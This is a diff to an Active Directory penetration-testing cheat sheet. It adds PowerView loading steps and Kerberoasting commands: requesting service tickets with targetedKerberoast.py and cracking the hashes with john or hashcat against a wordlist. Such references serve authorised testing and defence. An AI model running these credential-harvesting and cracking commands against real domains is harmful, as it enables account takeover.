@@ -284,6 +284,12 @@ Enter-PSSession -ComputerName <computer_name> -Credential $cred
 ### :open_file_folder: PowerView
 
 ```powershell
+Import-Module .\PowerView.ps1
+# check if loading is successful
+Get-Module
+```
+
+```powershell
 # Groups
 Get-NetGroup
 ```
@@ -317,6 +323,12 @@ Kerberoasting - get user TGS ticket
 
 ```powershell
 Get-DomainUser -Identity <AD account> | Get-DomainSPNTicket -Format Hashcat
+```
+
+```shell
+targetedKerberoast.py -d <domain> -u <username> -p <password> --dc-ip <dc ip>
+# john /tmp/hashes --wordlist=rockyou.txt
+# hashcat -m 13100 --force -a 0 hashes rockyou.txt   
 ```
 
 ### :open_file_folder: [CrackMapExec](https://mpgn.gitbook.io/crackmapexec/)
